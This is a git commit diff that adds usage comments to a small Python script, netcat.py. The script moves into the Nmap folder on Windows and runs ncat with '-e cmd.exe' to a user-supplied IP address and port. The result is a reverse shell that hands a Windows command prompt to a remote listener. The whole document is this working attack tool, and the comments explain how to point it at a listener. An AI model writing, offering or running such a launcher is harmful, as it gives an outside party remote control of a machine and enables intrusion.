dbf63a1083ca7a016518ba504e9094fa51726c8a
coreylynch00 <coreylynch4@gmail.com>
2022-01-13 16:35:45 +0000

    Added instructions

--- netcat.py
+++ netcat.py
@@ -1,4 +1,7 @@
 import os
 
+# Nmap must be installed in default location on host system
 os.chdir("C:/Program Files (x86)/Nmap/")
+
+# Input IP Address & Port Number where listener is set up 
 os.system('cmd /k "ncat -nv <IP Address> <Port> -e cmd.exe"')
